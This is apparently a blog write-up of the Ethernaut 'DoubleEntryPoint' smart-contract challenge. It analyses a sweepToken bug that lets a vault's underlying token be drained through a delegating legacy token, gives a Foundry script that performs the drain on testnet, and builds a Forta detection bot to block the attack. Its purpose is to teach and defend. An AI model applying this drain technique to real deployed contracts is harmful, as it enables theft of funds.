![](https://ethernaut.openzeppelin.com/imgs/BigLevel26.svg)

powered by [![|200](https://ethernaut.openzeppelin.com/imgs/forta.svg)](https://forta.org|)

This level features a `CryptoVault` with special functionality, the `sweepToken` function. This is a common function used to retrieve tokens stuck in a contract. The `CryptoVault` operates with an `underlying` token that can't be swept, as it is an important core logic component of the `CryptoVault`. Any other tokens can be swept.

The underlying token is an instance of the DET token implemented in the `DoubleEntryPoint` contract definition and the `CryptoVault` holds 100 units of it. Additionally the `CryptoVault` also holds 100 of `LegacyToken LGT`.

In this level you should figure out where the bug is in `CryptoVault` and protect it from being drained out of tokens.

The contract features a `Forta` contract where any user can register its own `detection bot` contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a `detection bot` and register it in the `Forta` contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.

Things that might help:

- How does a double entry point work for a token contract?

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

Solution:
## Analysis

We have two ERC20 token contracts, `LegacyToken (LGT)` and `DoubleEntryPoint (DET)`, and a vault `CryptoVault` with a very special function that also happens to be vulnerable. The `CryptoVault` initially holds 100 tokens each of LGT and DET. Let's take a look at the contracts one by one starting with the `LegacyToken`.
___
### LegacyToken

```sol
contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}
```

- This contract is overriding the default `transfer()` function from ERC20 and making some weird changes.
    - This is checking that if the `delegate` address is not set or is set to a `0` address, just call the `transfer()` function from the ERC20.
    - If it is set to something else, call the `delegateTransfer()` function on the `delegate()` contract address. In this case, the `delegate` contract is the `DoubleEntryPoint` contract.
- The `delegateToNewContract()` is setting the value of the `delegate` contract which is controlled by `onlyOwner` (only the owner can call this function).

---
### DoubleEntryPoint

```sol
contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

- The constructor is defining all the addresses, and is also minting 100 LGT to the CryptoVault.
- The modifier `onlyDelegateFrom()` is making sure that the `msg.sender` should only be the `delegatedFrom` contract which is set to the address of the `LegacyToken`. This means that whichever function has this modifier, that function can only be called by the `LegacyToken` and no one else.
- The modifier `fortaNotify()` is the one used by the Forta bot.
    - This modifier stores the old number of alerts raised by the bot, executes the function logic on which the modifier is set and then compares the old number of alerts with the new number to see if an alert was raised. If it was, then the whole transaction is reverted. This is what we have to make use of. Since this modifier is only used on the `delegateTransfer()` function, there has to be some bug in there.
- The function `delegateTransfer()` is the one which the `LegacyToken` was calling which we discussed above.
    - This function has the `onlyDelegateFrom()` modifier set allowing only `LegacyTokens` to call this function and the `fortaNotify()` which acts as a bot detection and monitoring feature and reverts the function execution if an alert is raised.
    - This function is calling the ERC20 `_transfer` function which is transferring the `value` amount of tokens from `origSender` to the address `to`.

---
### CryptoVault

```sol
contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) public {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}
```

- The function `setUnderlying()` is setting the address for the underlying token which is `DoubleEntryPoint` in this case. This can only be called once due to the validating condition in the `require()` statement.
- The function `sweepToken()` is a goldmine for the attacker. This is taking an ERC20 token contract address as the function argument and making sure that it's not equal to the underlying token (`DoubleEntryPoint`). Then it's calling the `transfer()` function on the `token` address which transfers the Vault's token balance for the token contract specified and sends it to the `sweptTokensRecipient` address.
- The `sweptTokensRecipient` is not controlled by us and is set during the deployment of the contract inside the constructor.

Did you spot the bug yet? If not, no worries. Neither did I on the first try.

---
## The Vulnerability

Let's say we are the attackers and we wanted to exploit this contract-vault conjunction and want to drain the `CryptoVault`. The only function capable of draining the vault is `sweepToken`. But we can't drain the `DET` directly due to the input validation. But what if we enter the address of the `LGT` here?

The Vault will try to call the function `LegacyToken.transfer()` which directs the flow into the `LegacyToken` contract.

The `LegacyToken` will call the overridden function and will make the following call:

```sol
delegate.delegateTransfer(to, value, msg.sender); == DoubleEntryPoint.delegateTransfer(sweptTokensRecipient, CryptoVault's Total Balance, CryptoVault's Address);
```

The `delegate` contract will be `DoubleEntryPoint` as set in the contract by the owner, and the `msg.sender` will be the `CryptoVault` since it sent the transaction to the `LegacyToken`. The `value` will be equal to `CryptoVault's` total balance, i.e., `token.balanceOf(address(this))`.

Now the execution flow will go to `DoubleEntryPoint` contract inside the `delegateTransfer()` function.

- The `onlyDelegateFrom` will be bypassed because in this case according to what `DoubleEntryPoint` contract sees, `msg.sender` is `LegacyToken` because it sent the transaction. This will cause the underlying tokens (`DET`) to be swept/drained from the `CryptoVault` bypassing the validation we had in the vault - `require(token != underlying, "Can't transfer underlying token");`.

Let's try to replicate the attack.

---
## The Exploit

The contract object which Ethernaut gives us in the console is `DoubleEntryPoint` contract. We can validate this by fetching the address of the `CryptoVault` and then querying the value of `underlying`. Let's run a small script to confirm our hypothesis and get the addresses for the vault, DET, and LGT tokens:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel26.sol";

contract POC is Script {

     DoubleEntryPoint level26 = DoubleEntryPoint(0xBDc7cd60eca4b6EA63A4e5A37d543Ff803B6D6DA);
    function run() external{
        vm.startBroadcast();

        address CryptoVault = level26.cryptoVault();
        CryptoVault.call(abi.encodeWithSignature("underlying()"));
        address LGT = level26.delegatedFrom();

        vm.stopBroadcast();
    }
}
```

Let's run the script using the following command:

```
forge script ./script/level26.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
```

It can be seen in the screenshot below that the first address was for the `CryptoVault` and the next one was fetched from the `CryptoVault` and which also matches the instance address provided to us by Ethernaut.

The last one is coming from `delegatedFrom` which should be the address of `LegacyToken`.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1665834917383/0kJP2tZhs.png?auto=compress,format&format=webp)

Since we got the address of the `CryptoVault`, let's also confirm on the Goerli explorer to check the number of tokens stored in the vault:

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1665835311342/_y2Td2Wml.png?auto=compress,format&format=webp) So the vault owns 100 tokens each of LGT and DET. Now that we are sure, let's drain all the DET from the vault. Here's our new code:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel26.sol";

contract POC is Script {

     DoubleEntryPoint level26 = DoubleEntryPoint(0xBDc7cd60eca4b6EA63A4e5A37d543Ff803B6D6DA);
    function run() external{
        vm.startBroadcast();

        CryptoVault vault = CryptoVault(level26.cryptoVault());
        address DET = address(vault.underlying());
        address LGT = level26.delegatedFrom();
        vault.sweepToken(IERC20(LGT)); //calling sweepToken with LGT address on the CryptoVault

        vm.stopBroadcast();
    }
}
```

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1665843730964/PkXmXvxBc.png?auto=compress,format&format=webp)

And as expected, the vault was drained of DET tokens which can also be verified on the Etherscan:

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1665843571597/eWGDqO0tC.png?auto=compress,format&format=webp)

---
## The Mitigation Analysis (Forta Bot)

Let's take a look at the last contract that we skipped earlier:
### Forta

```sol
contract Forta is IForta {
    mapping(address => IDetectionBot) public usersDetectionBots;
    mapping(address => uint256) public botRaisedAlerts;

    function setDetectionBot(address detectionBotAddress) external override {
            require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
            usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
    }

    function notify(address user, bytes calldata msgData) external override {
        if(address(usersDetectionBots[user]) == address(0)) return;
        try usersDetectionBots[user].handleTransaction(user, msgData) {
                return;
        } catch {}
    }

    function raiseAlert(address user) external override {
            if(address(usersDetectionBots[user]) != msg.sender) return;
            botRaisedAlerts[msg.sender] += 1;
    } 
}
```

- The function `setDetectionBot()` is setting the address of a detection bot for the `msg.sender` inside `usersDetectionBots[msg.sender]`. We'll use this to set our own bot address.
- The function `notify()` is calling `handleTransaction()` function on the bot address. The `handleTransaction()` function will be implemented by us to handle the conditions for which the alerts will be raised. Note that `notify()` is being called inside the modifier `fortaNotify()`. This is how the call data is sent to the bot.
- Lastly, the function `raiseAlert()` is just incrementing the number of alerts for `msg.sender` by 1.

There's an interface as well called `IDetectionBot` with a single function signature called `handleTransaction()`.

```sol
interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}
```

We need to build a bot, that will extend the `IDetectionBot` interface and will implement a function called `handleTransaction()` that will raise an alert if certain conditions are met. Now onto the condition part.

---
## The Detection

We need our bot to detect malicious transactions that are draining the `CryptoVault` contract. The attack happened using the following steps:

1. `CryptoVault.sweepToken(LGT)` - `CryptoVault` made a call to the `sweepToken` function with the address of the `LegacyToken` contract.
2. This called the function `LegacyToken.transfer(sweptTokensRecipient, CryptoVault's Token Balance);`.
3. Inside the `LegacyToken`, a call was made to `DoubleEntryPoint.delegateTransfer(sweptTokensRecipient, CryptoVault's Total Balance, CryptoVault's Address);`.
4. Now the execution flow will reach the `delegateTransfer()` function with the address `origSender` as the address of the `CryptoVault`.

Based on the above observation, we can create a detection to raise an alert if the value of `origSender` == value of `CryptoVault`.

---
## Bot Development

When the function `delegateTransfer()` is called, the modifier `fortaNotify()` is taking in `msg.data` and passing it to the `forta.notify()` function. We can make use of this `msg.data` and create our bot logic.

To proceed further, we must learn how the `msg.data` is organized and received by the bot.

- Initially, the `msg.data` received by the modifier `fortaNotify()` will contain the following function signature - `function delegateTransfer(address to, uint256 value, address origSender)`.
- This is then sent to the `notify()` function which is making a call to the `handleTransaction(user, msgData)` function. This will change the `msg.data` as received by our function.
- The final `msg.data` will contain the `msg.data` for the `function handleTransaction(address user, bytes calldata msgData) external;` and inside the second argument `bytes calldata msgData` will be our actual `msg.data` for the `delegateTransfer()` function. This is what we need to access in order to get the value of `origSender`.

To learn more about how this is arranged, refer to the second half of the writeup [here](https://dev.to/erhant/ethernaut-26-double-entry-point-1nfp).

The following table shows the arrangement of calldata as seen by our Detection bot which we'll develop. The value which we want to focus on is `origSender` on `0xa8` position.

|Position|Bytes/Length|Variable Type|Value|
|---|---|---|---|
|0x00|4|bytes4|Function selector of `handleTransaction(address,bytes)` == `0x220ab6aa`|
|0x04|32|address|`user` address|
|0x24|32|uint256|Offset of `msgData`|
|0x44|32|uint256|Length of `msgData`|
|0x64|4|bytes4|Function selector of `delegateTransfer(address,uint256,address)` == `0x9cd1a121`|
|0x68|32|address|`to` parameter address|
|0x88|32|uint256|`value` parameter|
|0xA8|32|address|`origSender` parameter address (WE NEED THIS)|
|0xC8|28|bytes|zero-padding as per the 32-byte arguments rule of encoding bytes|

Function signatures can be obtained using the following command:

```shell
cast sig "handleTransaction(address,bytes)"
```

From the table above, it can be seen that the first half deals with the function `handleTransaction()` and the next half is its argument `msgData` that contains `delegateTransfer()` call with the parameter `origSender` which we need to extract.

---
## The Final Code

Here's how our Alert Bot looks:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract AlertBot is IDetectionBot {
    address private cryptoVault;

    constructor(address _cryptoVault) public {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external override {

        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if(origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

- We have copied the codes for both interfaces. The variable `cryptoVault` is holding the address of the `CryptoVault` contract.
- The opcode `calldataload(0xa8)` extracts 32 bytes from the calldata starting from the `0xa8` byte.
- This is then compared to check if the `CryptoVault` is the one in `origSender` and an alert is raised.

Let's deploy this bot contract.

Now we just need to send a call to register our bot.